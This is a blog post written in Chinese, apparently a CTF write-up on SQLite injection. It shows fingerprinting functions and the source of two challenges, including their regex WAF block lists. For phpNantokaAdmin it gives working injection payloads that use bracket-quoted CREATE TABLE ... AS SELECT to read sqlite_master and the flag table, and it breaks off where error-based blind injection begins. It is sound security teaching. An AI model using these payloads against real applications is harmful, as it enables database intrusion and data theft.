<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"landvsec.top",root:"/",scheme:"Gemini",version:"7.7.2",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="本文由landvsec原创发布转载，请参考转载声明，注明出处： https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222625安全客 - 有思想的安全新媒体            前言几次比赛都遇到了 SQLite 注入的题目，所以想来具体学习一下 SQLite 到底有哪些利用点。行文如有不当，还请师傅们在评论区留言捉虫，不甚感激。"><meta property="og:type" content="article"><meta property="og:title" content="CTF中的SQLite合集"><meta property="og:url" content="https://landvsec.top/archives/d8b7f817.html"><meta property="og:site_name" content="My Pureland"><meta property="og:description" content="本文由landvsec原创发布转载，请参考转载声明，注明出处： https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222625安全客 - 有思想的安全新媒体            前言几次比赛都遇到了 SQLite 注入的题目，所以想来具体学习一下 SQLite 到底有哪些利用点。行文如有不当，还请师傅们在评论区留言捉虫，不甚感激。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://i.loli.net/2020/12/05/v3AQ1RazYnXFD2w.png"><meta property="og:image" content="https://i.loli.net/2020/11/11/3yjqAYaFnIzOeNd.png"><meta property="og:image" content="https://i.loli.net/2020/11/11/UgNA3oCO2dWjY1b.png"><meta property="og:image" content="https://i.loli.net/2020/11/11/quSx32GhN9aVOzt.png"><meta property="og:image" content="https://i.loli.net/2020/11/11/E57ATl9OZU2BiFD.png"><meta property="og:image" content="https://i.loli.net/2020/11/11/JGAwOYUvPhoHbfd.png"><meta property="og:image" content="https://i.loli.net/2020/11/11/QXFKjdHMwuDEmsC.png"><meta property="og:image" content="https://i.loli.net/2020/11/12/NgcCQxJ6EpmnePT.png"><meta property="og:image" content="https://i.loli.net/2020/11/12/xlyhmtvaBHYVsr6.png"><meta property="og:image" content="https://i.loli.net/2020/11/12/uh4NmtZgJCbjxPd.png"><meta property="article:published_time" content="2020-11-11T01:00:46.000Z"><meta property="article:modified_time" content="2020-12-05T13:29:11.898Z"><meta property="article:author" content="landvsec"><meta property="article:tag" content="SQLite注入"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://i.loli.net/2020/12/05/v3AQ1RazYnXFD2w.png"><link rel="canonical" href="https://landvsec.top/archives/d8b7f817.html"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>CTF中的SQLite合集 | My Pureland</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="My Pureland" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">My Pureland</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="site-search"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"></div></div><div class="search-pop-overlay"></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://landvsec.top/archives/d8b7f817.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/landv.jpg"><meta itemprop="name" content="landvsec"><meta itemprop="description" content="困于山中，被鬼追逐。"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="My Pureland"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF中的SQLite合集</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-11-11 09:00:46" itemprop="dateCreated datePublished" datetime="2020-11-11T09:00:46+08:00">2020-11-11</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-12-05 21:29:11" itemprop="dateModified" datetime="2020-12-05T21:29:11+08:00">2020-12-05</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a> </span></span><span id="/archives/d8b7f817.html" class="post-meta-item leancloud_visitors" data-flag-title="CTF中的SQLite合集" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/archives/d8b7f817.html#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/archives/d8b7f817.html" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>13k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>12 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><div class="note info"><p>本文由<strong>landvsec</strong>原创发布<br>转载，请参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/222625">https://www.anquanke.com/post/id/222625</a><br>安全客 - 有思想的安全新媒体</p></div><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几次比赛都遇到了 SQLite 注入的题目，所以想来具体学习一下 SQLite 到底有哪些利用点。行文如有不当，还请师傅们在评论区留言捉虫，不甚感激。</p><a id="more"></a><h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite 直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL 数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定/默认数据库名/地址的问题，可下载造成安全威胁。</p><h2 id="数据库判别"><a href="#数据库判别" class="headerlink" title="数据库判别"></a>数据库判别</h2><p>拿到一个环境首先做的应该是后端数据库的判别。</p><p>以下列出的是可供判别后端数据库的函数，在同一行并不意味着功能相同：</p><div class="table-container"><table><thead><tr><th>MYSQL</th><th>SQLite</th></tr></thead><tbody><tr><td>@@version / version()</td><td>sqlite_version()</td></tr><tr><td>connection_id()</td><td>last_insert_rowid()</td></tr><tr><td>last_insert_id()</td><td>strftime(‘%s’,’now’);</td></tr><tr><td>row_count()</td><td></td></tr><tr><td>crc32(‘MySQL’)</td><td></td></tr><tr><td>BINARY_CHECKSUM(123)</td></tr></tbody></table></div><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>接下来通过两道题来理解 SQLite 的一些特性，方便我们后面总结 Cheat Sheet：</p><h2 id="phpNantokaAdmin"><a href="#phpNantokaAdmin" class="headerlink" title="phpNantokaAdmin"></a>phpNantokaAdmin</h2><p>路由 index、create、insert、delete ，功能对应显示、创建表、插入数据、删表。</p><p>先看有关 flag 的信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(<span class="string">&#x27;CREATE TABLE `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` (`&#x27;</span> . FLAG_COLUMN . <span class="string">&#x27;` TEXT);&#x27;</span>);</span><br><span class="line">$pdo-&gt;query(<span class="string">&#x27;INSERT INTO `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` VALUES (&quot;&#x27;</span> . FLAG . <span class="string">&#x27;&quot;);&#x27;</span>);</span><br><span class="line">$pdo-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>这是源码中创建完用户自定义的表后，使用 config.php 中定义好了的 <code>FLAG_TABLE</code> 、<code>FLAG_COLUMN</code>、<code>FLAG</code> 三个常量创建表，作为我们的 <code>target</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;query(<span class="string">&quot;SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27; AND name &lt;&gt; &#x27;&quot;</span> . FLAG_TABLE . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>);</span><br></pre></td></tr></table></figure><p>当然，它不会就这么简单地显示在 index 页面中。</p><p>我们要做的就是通过自定义表利用可控变量达到注出 <code>FLAG_TABLE</code> 数据的目的。</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$table_name = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;table_name&#x27;</span>];</span><br><span class="line">$columns = $_POST[<span class="string">&#x27;columns&#x27;</span>];</span><br><span class="line"><span class="comment">//sqlite 创建表语句 sqlite3 database_name.db</span></span><br><span class="line">$filename = bin2hex(random_bytes(<span class="number">16</span>)) . <span class="string">&#x27;.db&#x27;</span>;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:db/&#x27;</span> . $filename);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_valid($table_name)) &#123;</span><br><span class="line">  flash(<span class="string">&#x27;Table name contains dangerous characters.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strlen($table_name) &lt; <span class="number">4</span> || <span class="number">32</span> &lt; strlen($table_name)) &#123;</span><br><span class="line">  flash(<span class="string">&#x27;Table name must be 4-32 characters.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count($columns) &lt;= <span class="number">0</span> || <span class="number">10</span> &lt; count($columns)) &#123;</span><br><span class="line">  flash(<span class="string">&#x27;Number of columns is up to 10.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;CREATE TABLE <span class="subst">&#123;$table_name&#125;</span> (&quot;</span>;</span><br><span class="line">$sql .= <span class="string">&quot;dummy1 TEXT, dummy2 TEXT&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($columns); $i++) &#123;</span><br><span class="line">  $column = (<span class="keyword">string</span>) ($columns[$i][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  $type = (<span class="keyword">string</span>) ($columns[$i][<span class="string">&#x27;type&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_valid($column) || !is_valid($type)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Column name or type contains dangerous characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen($column) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($column) || strlen($type) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($type)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Column name and type must be 1-32 characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $sql .= <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">  $sql .= <span class="string">&quot;`<span class="subst">$column</span>` <span class="subst">$type</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql .= <span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><p>表名和列名、列属性都是我们可控的，SQL 语句拼接如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#123;$table_name&#125; (dummy1 TEXT, dummy2 TEXT, &#96;$column&#96; $type);</span><br></pre></td></tr></table></figure><p>utils.php waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// comment out, calling function...</span></span><br><span class="line">    <span class="string">&quot;[\&quot;#&#x27;()*,\\/\\\\`-]&quot;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//正则表达式：/[&quot;#&#x27;()*,\/\\`-]/i</span></span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $string)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>要想绕过，首先介绍 SQLite 的几个特性：</p><blockquote><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlite.org/lang_keywords.html">SQLite Keywords</a></p><p>SQLite 中使用关键字作为名称，有四种引用方法：</p><p><img src="https://i.loli.net/2020/12/05/v3AQ1RazYnXFD2w.png" style="zoom:80%"></p><p>括在方括号中的关键字是标识符。这不是标准的 SQL。MS access 和 SQL server 使用这种引用机制，SQLite 中包含这种引用机制是为了兼容。</p><p><img src="https://i.loli.net/2020/11/11/3yjqAYaFnIzOeNd.png" alt=""></p><p>既然正则中所有引号都有匹配，我们可以使用 <code>[]</code> 括关键字进行绕过，并可用它来<strong>注释</strong>，代替 <code>--</code> 。</p><p>MYSQL 中有 information_schema 这样的系统表方便注入查询，而 SQLite 有无？</p><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlite.org/schematab.html">sqlite_master</a></p><p>每个 SQLite 数据库都包含一个“模式表” ，用于存储该数据库的模式。数据库的模式是对数据库中包含的所有其他表、索引、触发器和视图的描述。模式表如下所示：</p><p><img src="https://i.loli.net/2020/11/11/UgNA3oCO2dWjY1b.png" style="zoom:80%"></p><p>其中 sql 字段的含义：</p><p>Sqlite _ schema.SQL 列存储描述对象的 SQL 文本。此 SQL 文本是 CREATE TABLE、 CREATE VIRTUAL TABLE、 CREATE INDEX、 CREATE VIEW 或 CREATE TRIGGER 语句，如果在数据库文件为数据库连接的主数据库时对其进行计算，则将重新创建该对象。<strong>文本通常是用于创建对象的原始语句的副本。</strong></p><p>换而言之，我们可以通过查询 sqlite_master 中的 sql 知晓 <code>FLAG_TABLE</code> 创建时的语句，获取到其表名和列名。</p><p>综上，我们所要利用的有两张表，这就需要能操作两张表的，与 create table 有关的用法。</p><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlite.org/lang_createtable.html">CREATE TABLE … AS SELECT Statements</a></p><p>“ CREATE TABLE… AS SELECT” 语句基于 SELECT 语句的结果创建并填充数据库表。该表的列数与 SELECT 语句返回的行数相同。每个列的名称与 SELECT 语句的结果集中相应列的名称相同。每个列的声明类型由 SELECT 语句结果集中相应表达式的表达式亲和类型确定。</p><p>使用 create table as 创建的表<strong>最初由 SELECT 语句返回的数据行填充</strong>。按照 SELECT 语句返回行的顺序，以连续升序的 rowid 值 (从1开始) 进行分配。</p></blockquote><p>由上，也就是说，我们能这样构造语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE landv as select sql [(dummy1 TEXT, dummy2 TEXT, &#96;whatever you want&#96; ] from sqlite_master;);</span><br><span class="line">--前面说过，[] 可用作注释（别名），也就是说，上面语句等价为</span><br><span class="line">CREATE TABLE landv as select sql from sqlite_master;</span><br><span class="line">--landv 这张由用户创建的表就会被 select 语句返回的数据行填充</span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;路由 create 下 post</span><br><span class="line">table_name&#x3D;landv as select sql [&amp;columns[0][name]&#x3D;abc&amp;columns[0][type]&#x3D;] from sqlite_master;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/11/quSx32GhN9aVOzt.png" style="zoom:80%"></p><p>返回填充的第一行就是我们查出来的创建 <code>FLAG_TABLE</code> 的原始语句，同理，我们可以借此查出 flag 。</p><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;路由 create 下 post</span><br><span class="line">table_name&#x3D;landv as select flag_2a2d04c3 [&amp;columns[0][name]&#x3D;abc&amp;columns[0][type]&#x3D;] from flag_bf1811da;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/11/E57ATl9OZU2BiFD.png" style="zoom:80%"></p><p>这道题主要是面向创表过程中可能的注入，但实际中运用得少（没有权限），接下来我们看整体。</p><h2 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h2><p>给了数据库文件和部分源码。</p><p>vote.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// waf</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// N.B</span></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>schema.sql (actual flag is removed)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS &#96;vote&#96;;</span><br><span class="line">CREATE TABLE &#96;vote&#96; (</span><br><span class="line">  &#96;id&#96; INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">  &#96;name&#96; TEXT NOT NULL,</span><br><span class="line">  &#96;count&#96; INTEGER</span><br><span class="line">);</span><br><span class="line">INSERT INTO &#96;vote&#96; (&#96;name&#96;, &#96;count&#96;) VALUES</span><br><span class="line">  (&#39;dog&#39;, 0),</span><br><span class="line">  (&#39;cat&#39;, 0),</span><br><span class="line">  (&#39;zebra&#39;, 0),</span><br><span class="line">  (&#39;koala&#39;, 0);</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;flag&#96;;</span><br><span class="line">CREATE TABLE &#96;flag&#96; (</span><br><span class="line">  &#96;flag&#96; TEXT NOT NULL</span><br><span class="line">);</span><br><span class="line">INSERT INTO &#96;flag&#96; VALUES (&#39;HarekazeCTF&#123;&lt;redacted&gt;&#125;&#39;);</span><br></pre></td></tr></table></figure><p>过滤非常严格。</p><p>这道题的 SQL 语句是 update <code>vote</code> 表中的 <code>count</code> 自增，并且还会有更新是否成功的回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($res === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这基本可以确定是盲注了（从上面的 <code>banword</code> 也可以猜测），接下来我们需要的是故意使其报错，以便我们判断盲注是否正确。</p><h3 id="基于错误的-SQLite-盲注"><a href="#基于错误的-SQLite-盲注" class="headerlink" title="基于错误的  SQLite 盲注"></a>基于错误的 SQLite 盲注</h3><h4 id="可供制造错误的函数"><a href="#可供制造错误的函数" 